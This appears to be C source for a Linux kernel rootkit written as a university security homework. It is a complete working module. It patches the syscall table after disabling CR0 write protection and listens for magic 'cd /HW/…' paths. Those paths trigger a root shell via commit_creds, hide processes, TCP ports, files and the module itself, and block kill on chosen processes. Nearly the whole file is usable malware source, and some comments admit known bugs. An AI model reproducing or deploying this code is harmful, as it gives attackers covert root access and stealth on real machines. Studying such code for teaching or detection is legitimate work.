#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/pgtable.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <asm/uaccess.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/file.h>
#include <linux/workqueue.h>
#include <linux/init.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/string.h>
#include <linux/fs_struct.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <net/tcp.h>
#include <linux/fdtable.h>
#include <linux/proc_ns.h>
#include <linux/kprobes.h>




MODULE_LICENSE("GPL");
MODULE_AUTHOR("iieRD6-G1");
MODULE_DESCRIPTION("UCAS Software Security Homework for Team1 in 2021");
#define DEBUG 0
static void **sysCallTable = 0;
unsigned long Cr0value;
static char command[PATH_MAX];
typedef long (*syscall_fun)(const struct pt_regs *regs);



// 定义各功能的调用号，包括提权，隐藏进程，隐藏端口，隐藏文件等

#define MagicHW "/HW/"
#define SigGetRoot "/HW/1145/"
#define SigHideProc "/HW/514/"
#define SigHidePort "/HW/1919/"
#define SigHideFile "/HW/8100/"
#define SigHideModule "/HW/4399/"
#define SigProtectProc "/HW/2333/"
#define SigShowProc "/HW/415/"
#define SigShowPort "/HW/9191/"
#define SigShowFile "/HW/1818/"
#define SigShowModule "/HW/9344/"
#define SigUnprotectProc "/HW/2233/"

//定义模块名
#define MODULE_NAME "myrootkit"
#define MODULE_FILE "myrootkit.ko"

int hideModuleSelf(void);
int showModuleSelf(void);

//原始调用
asmlinkage int (*ref_sys_chdir)(const char *filename);
asmlinkage int (*ref_iterate_proc)(struct file *, struct dir_context *); 
asmlinkage int (*ref_filldir_proc)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
asmlinkage int (*ref_sys_kill)(pid_t pid,int sig);
asmlinkage int (*ref_sys_seq_show)(struct seq_file *s,void *v);
asmlinkage long (*ref_sys_getdents)(unsigned int,struct linux_dirent __user *, unsigned int);  
asmlinkage long (*ref_sys_getdents64)(unsigned int,struct linux_dirent64 __user *, unsigned int);


//用于把目标目录的iterate替换成fake iterate
#define set_f_op(op, path, new, old)    {\
        struct file *filp;              \
        struct file_operations *f_op;   \
        filp = filp_open(path, O_RDONLY, 0);        \
        if(IS_ERR(filp)){                           \
            old = NULL;                                     \
        }                                                   \
        else{                                               \
            f_op = (struct file_operations *)filp->f_op;    \
            old = f_op->op;                                 \
            f_op->op = new;                                 \
        }                                                   \
    }
//替换seq_show
#define set_afinfo_seq_op(op, path, afinfo_struct, new, old){ \
        struct file *filp;  \
        afinfo_struct *afinfo;  \
        filp = filp_open(path, O_RDONLY, 0);    \
        if(IS_ERR(filp)){   \
            old = NULL; \
        }   \
        else{   \
                afinfo = PDE_DATA(filp->f_path.dentry->d_inode);    \
                old = afinfo->seq_ops.op;   \
                afinfo->seq_ops.op = new;   \
                filp_close(filp, 0);    \
        }   \
    }


struct linux_dirent
{
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};

//定义双向链表，实现链表相关的操作
struct List{
    unsigned long long data;
    struct List* next;
    struct List* last;
};



//判断是否在链上，从头节点开始遍历
int isInList(struct List *head, unsigned long long data ){
    struct List *p =head;
    while (p)
    {
        //找到节点
        if(p->data==data){
            return 1;
        }
        p=p->next;
    }
    return 0;
    
}

//插入节点
void insertNode(struct List * head,unsigned long long data){
    //如果存在，返回
    if(isInList(head,data)){
        return;
    }
    //如果不存在，就插入节点
    struct List* p = head;
    //创建新节点，分配内存空间
    struct List* n = (struct List*)kmalloc(sizeof(struct List), GFP_KERNEL);
    //void *kmalloc(size_t size ,int flags);
    n->data = data;
    n->next = NULL;
    
    //向链尾插入新节点
    while (p -> next != NULL)
    {
        p = p->next;
    }
    n->last = p;
    p->next = n;
}

//删除链表节点
struct List* deleteNode(struct List* head,unsigned long long data)
{
    struct List* p = head;
    //是否是头结点
    if(p->data == data)
    {
        struct List* t = p->next;
        kfree(p);
        t ->last = NULL;
        return t;
    }
    while (p -> data != data)
    {
        p = p->next;
        if(p == NULL)
        {
            return head;
        }
    }
    //把前后节点连上
    if(p->last != NULL)
    {
        p->last->next = p->next;
    }
    if(p->next != NULL)
    {
        p->next->last = p->last;
    }

    kfree(p);
    return head;
}

// 删除整个链表
void deleteList(struct List* head)
{
    struct List* p = head;
    while (p)
    {
        struct List* t = p;
        p = p->next;
        kfree(t);
    }
}


// 定义name链表
struct nameList {
    char* data;
    struct nameList* next;
    struct nameList* last;
};

//判断是否在链上，从头节点开始遍历
int isInNameList(struct nameList* head, char* data) {
    struct nameList* p = head;
    while (p)
    {
        //找到节点
        if ((p->data!=NULL)&&strcmp(p->data, data) == 0) {
            printk(KERN_INFO"yes %s",p->data);
            return 1;
        }
        p = p->next;
    }
    return 0;
}

//插入节点
void insertNameNode(struct nameList* head, char* data) {
    //如果存在，返回
    if (isInNameList(head, data)) {
        return;
    }
    //如果不存在，就插入节点
    struct nameList* p = head;
    //创建新节点，分配内存空间
    struct nameList* n = (struct nameList*)kmalloc(sizeof(struct nameList),GFP_KERNEL);
    //void *kmalloc(size_t size ,int flags);
    n->data = (char*)kmalloc(strlen(data),GFP_KERNEL);
    strcpy(n->data, data);
    n->next = NULL;
    //向链尾插入新节点
    while (p->next != NULL)
    {
        p = p->next;
    }
    n->last = p;
    p->next = n;
}

//删除链表节点
struct nameList* deleteNameNode(struct nameList* head, char* data)
{
    struct nameList* p = head;
    //是否是头结点
    if (p->data!=NULL&&strcmp(p->data,data)==0)
    {
        struct nameList* t = p->next;
        kfree(p);
        t->last = NULL;
        return t;
    }
    while((p->data==NULL)||strcmp(p->data, data) != 0)
    {
        p = p->next;
        if (p == NULL)
        {
            return head;
        }
    }
    //把前后节点连上
    if (p->last != NULL)
    {
        p->last->next = p->next;
    }
    if (p->next != NULL)
    {
        p->next->last = p->last;
    }
   // free(p->data);
    kfree(p);
    return head;
}

// 删除整个链表
void deleteNameList(struct nameList* head)
{
    struct nameList* p = head;
    while (p)
    {
        struct nameList* t = p;
        p = p->next;
        kfree(t);
    }
}



//初始化PID链表，port链表,进程保护链表,filename链表，module链表
struct List* hiddenPID;
struct List* hiddenPort;
struct List* protectProc;
struct nameList* fileName;
struct nameList* moduleName;
void ListInit(void){
    hiddenPID=(struct List*)kmalloc(sizeof(struct List), GFP_KERNEL);
    hiddenPID->data = 0;
    hiddenPID->last =NULL;
    hiddenPID->next =NULL;

    hiddenPort=(struct List*)kmalloc(sizeof(struct List), GFP_KERNEL);
    hiddenPort->data = 0;
    hiddenPort->last =NULL;
    hiddenPort->next =NULL;

    protectProc=(struct List*)kmalloc(sizeof(struct List), GFP_KERNEL);
    protectProc->data = 0;
    protectProc->last =NULL;
    protectProc->next =NULL;


    fileName=(struct nameList*)kmalloc(sizeof(struct nameList), GFP_KERNEL);
    fileName->data = NULL;
    fileName->last =NULL;
    fileName->next =NULL;

    moduleName=(struct nameList*)kmalloc(sizeof(struct nameList), GFP_KERNEL);
    moduleName->data = NULL;
    moduleName->last =NULL;
    moduleName->next =NULL;

}
void ListExit(void){
    deleteList(hiddenPID);
    deleteList(hiddenPort);
    deleteList(protectProc);

    deleteNameList(fileName);
    deleteNameList(moduleName);
}



//遍历 命令ls是遍历 /proc目录得到的信息，根据stace ls的结果 
//实际遍历操作由proc_root_readdir实现，是file_operations的成员iterate_shared
//修改filldir
int fakeFilldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    char *endp;
    long pid;

    // 把字符串变成长整数。
    pid = simple_strtol(name, &endp, 10);
    if(isInList(hiddenPID,pid)){
        // 是我们需要隐藏的进程，直接返回。
        return 0;
    }
    // 不是需要隐藏的进程，交给真的filldir填到缓冲区里。
    return ref_filldir_proc(ctx, name, namlen, offset, ino, d_type);
}

//修改iterate
int fakeIterate(struct file *filp, struct dir_context *ctx)
{
    ref_filldir_proc = ctx->actor;
    //保存当前的，替换成自己的
    *(filldir_t *)&ctx->actor = fakeFilldir;
    return ref_iterate_proc(filp, ctx);
}


// 用户进程通过读取/proc/net/tcp 来读取端口信息，通过fakeSeqShow来过滤需要隐藏的端口
int fakeSeqShow(struct seq_file *seq,void *v){
    struct sock* sk =v;
    if(v!=SEQ_START_TOKEN && isInList(hiddenPort,sk->sk_num)){
        printk("[DEBUG] hide tcp port: %hd\n", sk->sk_num);
        return 0;
    }
    return ref_sys_seq_show(seq, v);
}




void getRootShell(void){
    //提权，反弹一个root shell
    struct pt_regs user_regs;
    commit_creds(prepare_kernel_cred(0));
    user_regs.di = user_regs.si;
    if (!copy_to_user((void *)user_regs.di, (const void *)"/bin/sh", 8))
    {
        user_regs.si = 0;
        user_regs.dx = 0;
        ((syscall_fun)sysCallTable[__NR_execve])(&user_regs);
    }
}



int checkFileName(char* name)
{    
    if(isInNameList(fileName,name)){
        //如果在fileName 链表中
        return 1;
    }
    return 0;
}
long myGetdents (unsigned int fd,struct linux_dirent __user *dirp, unsigned int count,long ret){
    unsigned short p = 0;
    unsigned long off = 0;
    struct linux_dirent *dir, *kdir, *prev = NULL;
    struct inode *d_inode;

    if (ret <= 0)
        return ret;

    kdir = kzalloc(ret, GFP_KERNEL);
    if (kdir == NULL)
        return ret;

    if (copy_from_user(kdir, dirp, ret))
    {
        kfree(kdir);
        return ret;
    }
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
    {
        p = 1;
    }
    while (off < ret)
    {
        dir = (void *)kdir + off;
        if (checkFileName((char *)dir->d_name))
        {
            if (dir == kdir)
            {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        }
        else
        {
            prev = dir;
        }
        off += dir->d_reclen;
    }
    if (copy_to_user(dirp, kdir, ret))
    {
        kfree(kdir);
        return ret;
    }
    kfree(kdir);
    return ret;
}


// hook getdents系统调用实现文件隐藏功能
asmlinkage long hookGetdents(unsigned int fd,struct linux_dirent __user *dirp, unsigned int count){
    //printk(KERN_INFO"hook getdents!!");
    if(fileName->next==NULL){
        return ref_sys_getdents(fd,dirp,count);
    }
    int ret= ref_sys_getdents(fd,dirp,count);
    return myGetdents(fd,dirp,count,ret);
}








// hook kill 系统调用实现进程保护
asmlinkage int hookKill(pid_t pid,int sig){
    if(isInList(protectProc,(long)pid)){
        printk(KERN_INFO"hooking kill");
        return 0;
    }
    return ref_sys_kill(pid,sig);
}



//隐藏模块
void *saveModule;

asmlinkage int hookChdir(const char __user *filename){

    pid_t pid; //pid
    int port; // port
    char name[50]={};
    strncpy_from_user(command,filename,PATH_MAX);
    printk(KERN_INFO"command1 : %s",command);
    if(strncmp(command,MagicHW,strlen(MagicHW))==0){
        printk(KERN_INFO"command2 : %s",command);
        if(strncmp(command,SigGetRoot,strlen(SigGetRoot))==0){
            //获取root权限 cd /HW/1145/
            getRootShell();
            return 0;
        }else if(strncmp(command,SigHideProc,strlen(SigHideProc))==0){
            // 进程隐藏 cd /HW/514/pid
            if(sscanf(&command[strlen(SigHideProc)], "%d", &pid) == 1){
                if(isInList(hiddenPID,(long)pid)){
                    printk(KERN_INFO"Already hidden pid: %d",pid);
                    return 0;
                }else{
                    printk(KERN_INFO"Start hidden pid: %d",pid);
                    insertNode(hiddenPID,(long)pid);
                    return 0;
                }
            }
            return 0;
        }else if(strncmp(command,SigShowProc,strlen(SigShowProc))==0){
            // 进程显示 cd /HW/415/pid
            if(sscanf(&command[strlen(SigShowProc)], "%d", &pid) == 1){
                if(isInList(hiddenPID,(long)pid)){
                    printk(KERN_INFO"show hidden pid: %d",pid);
                    hiddenPID=deleteNode(hiddenPID,(long)pid);
                    return 0;
                }else{
                    printk(KERN_INFO"NO hidden pid: %d",pid);
                    return 0;
                }
            }
            return 0;
        }else if(strncmp(command,SigHidePort,strlen(SigHidePort))==0){
            // 隐藏端口 cd /HW/1919/port
            // 目前只支持tcp协议，如果比较有空可以添加其他协议
            if(sscanf(&command[strlen(SigHidePort)], "%d", &port) == 1){
                if(isInList(hiddenPort,(long)port)){
                    printk(KERN_INFO"Already hidden port: %d",port);
                    return 0;
                }else{
                    printk(KERN_INFO"Start hidden port: %d",port);
                    insertNode(hiddenPort,(long)port);
                    return 0;
                }
                return 0;
            }
            return 0;
        }else if(strncmp(command,SigShowPort,strlen(SigShowPort))==0){
            // 显示端口 cd /HW/9191/port
            if(sscanf(&command[strlen(SigShowPort)], "%d", &port) == 1){
                if(isInList(hiddenPort,(long)port)){
                    printk(KERN_INFO"show hidden port: %d",port);
                    hiddenPID=deleteNode(hiddenPort,(long)port);
                    return 0;
                }else{
                    printk(KERN_INFO"NO hidden port: %d",port);
                    return 0;
                }
                return 0;
            }
            return 0;
        }else if(strncmp(command,SigHideModule,strlen(SigHideModule))==0){
            // 隐藏模块 cd /HW/4399/name
            /// 简单实现: 隐藏rootkit模块就行
            if(hideModuleSelf()==1){
                printk(KERN_INFO"hide rootkit ok !");
                return 0;
            }else{
                printk(KERN_INFO"already hide rootkit!");
                return 0;
            }
            /// !todo 预期功能:moduleName链表中有的模块名的都隐藏,不过估计不会比较麻烦
            /**
            if(strncpy(name,&command[strlen(SigHideModule)],strlen(command)-strlen(SigHideModule))){
                printk(KERN_INFO"the module name is %s",name);
                if(isInNameList(moduleName,name)){
                    printk(KERN_INFO"Already hidden moudel:%s",name);
                    return 0;
                }else{
                    insertNameNode(moduleName,name);
                    printk(KERN_INFO"Start hidden moudel:%s",name);
                    return 0;
                }
                return 0;
            }
            return 0;
            **/
        }else if(strncmp(command,SigShowModule,strlen(SigShowModule))==0){
            // 显示模块 cd /HW/9344/name
            if(showModuleSelf()==1){
                printk(KERN_INFO"show rootkit ok !");
                return 0;
            }else{
                printk(KERN_INFO"already show rootkit!");
                return 0;

            }
            /**
            if(strncpy(name,&command[strlen(SigShowModule)],strlen(command)-strlen(SigShowModule))){
                printk(KERN_INFO"the module name is %s",name);
                if(isInNameList(moduleName,name)){
                    moduleName=deleteNameNode(moduleName,name);
                    printk(KERN_INFO"show hidden moudel:%s",name);
                    return 0;
                }else {
                    printk(KERN_INFO"no hidden moudel:%s",name);
                    return 0;
                }

            }
            **/
            return 0;
        }else if(strncmp(command,SigHideFile,strlen(SigHideFile))==0){
            // 隐藏文件 cd /HW/8100/filename
            //已知问题：通过hook getdents()导致所有目录叫这个名字的文件都没了
            //不过应该问题不大，反正演示录个屏就行了
            if(strncpy(name,&command[strlen(SigHideFile)],strlen(command)-strlen(SigHideFile))){
                printk(KERN_INFO"the file name is %s",name);
                if(isInNameList(fileName,name)){
                    printk(KERN_INFO"Already hidden file:%s",name);
                    return 0;
                }else{
                    insertNameNode(fileName,name);
                    printk(KERN_INFO"Start hidden file:%s",name);
                    return 0;
                }
                return 0;
            }

        }else if(strncmp(command,SigShowFile,strlen(SigShowFile))==0){
            // 显示文件 cd /HW/1818/name
            if(strncpy(name,&command[strlen(SigShowFile)],strlen(command)-strlen(SigShowFile))){
                printk(KERN_INFO"the file name is %s",name);
                if(isInNameList(fileName,name)){
                    fileName=deleteNameNode(fileName,name);
                    printk(KERN_INFO"show hidden file:%s",name);
                    return 0;
                }else {
                    printk(KERN_INFO"no hidden file:%s",name);
                    return 0;
                }
            }
            return 0;
        }else if(strncmp(command,SigProtectProc,strlen(SigProtectProc))==0){
            // 进程保护 cd /HW/2333/pid
            if(sscanf(&command[strlen(SigProtectProc)], "%d", &pid) == 1){
                 if(isInList(protectProc,(long)pid)){
                    printk(KERN_INFO"Already protect pid: %d",pid);
                    return 0;
                }else{
                    printk(KERN_INFO"Start protect port: %d",pid);
                    insertNode(protectProc,(long)pid);
                    return 0;
                }
                return 0;
            }
            return 0;
        }else if(strncmp(command,SigUnprotectProc,strlen(SigUnprotectProc))==0){
            // 取消进程保护 cd /HW/2233/pid
            if(sscanf(&command[strlen(SigUnprotectProc)], "%d", &pid) == 1){
                if(isInList(protectProc,(long)pid)){
                    printk(KERN_INFO"unprotect pid : %d",pid);
                    protectProc=deleteNode(protectProc,(long)pid);
                    return 0;
                }else{
                    printk(KERN_INFO"no protect pid: %d",pid);
                    return 0;
                }
                return 0;
            }
            return 0;
        }

    }
    return ref_sys_chdir(filename);

}




//隐藏进程 替换iterate

void hideProcStart(void){
    set_f_op(iterate_shared,"/proc",fakeIterate,ref_iterate_proc);
}

void hideProcExit(void){
    void *dummy;
    set_f_op(iterate_shared, "/proc", ref_iterate_proc, dummy);
}


int isHideSelf=0;
static struct list_head* prevModule=NULL;
int hideModuleSelf(void)
{
    if(isHideSelf){
        return 0;
    }
    prevModule = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    isHideSelf=1;
    return 1;
}

int showModuleSelf(void){
    if(!isHideSelf){
        return 0;
    }
    list_add(&THIS_MODULE->list,prevModule);
    isHideSelf=0;    
    return 1;

}


//隐藏端口 替换seq_show
void hidePortStart(void){
    set_afinfo_seq_op(show, "/proc/net/tcp", struct tcp_seq_afinfo, fakeSeqShow, ref_sys_seq_show);
    //!todo 时间多的话可以增加udp之类的其他网络协议
}

void hidePortExit(void){
    struct file* fp;
    struct tcp_seq_afinfo* afinfo;
    fp = filp_open("/proc/net/tcp", O_RDONLY, 0);
    afinfo = (struct tcp_seq_afinfo*)PDE_DATA(fp->f_path.dentry->d_inode);
    afinfo->seq_ops.show = ref_sys_seq_show;
    filp_close(fp, 0);    
}


static int __init rootkitStart(void){
    sysCallTable = (void *)kallsyms_lookup_name("sys_call_table");
    printk(KERN_INFO"sysCalltalbe addr is %p\n",(void*)sysCallTable);
    //关闭写保护
    Cr0value = read_cr0();
    write_cr0(Cr0value & ~0x00010000);
    //hook chdir函数
    ref_sys_chdir=(void *)sysCallTable[__NR_chdir];
    sysCallTable[__NR_chdir]=(unsigned long *)hookChdir;
    //hook kill函数
    ref_sys_kill=(void *)sysCallTable[__NR_kill];
    sysCallTable[__NR_kill]=(unsigned long *)hookKill; 
    //hook getdents函数
    ref_sys_getdents=(void *)sysCallTable[__NR_getdents];
    sysCallTable[__NR_getdents]=(unsigned long *)hookGetdents;


    hideProcStart();
    hidePortStart();
    //开启写保护
    write_cr0(Cr0value);

    ListInit();


    return 0;
}
static void __exit rootkitEnd(void){
    printk(KERN_INFO"rootkit exit\n");
    //关闭写保护
    Cr0value = read_cr0();
    write_cr0(Cr0value & ~0x00010000);

    //恢复原来的函数调用
    sysCallTable[__NR_chdir]=(unsigned long *)ref_sys_chdir;
    sysCallTable[__NR_kill]=(unsigned long *)ref_sys_kill;
    sysCallTable[__NR_getdents]=(unsigned long *)ref_sys_getdents;
    
    
    hideProcExit();
    hidePortExit();

    //开启写保护
    write_cr0(Cr0value);

    ListExit();

}
module_init(rootkitStart);
module_exit(rootkitEnd);


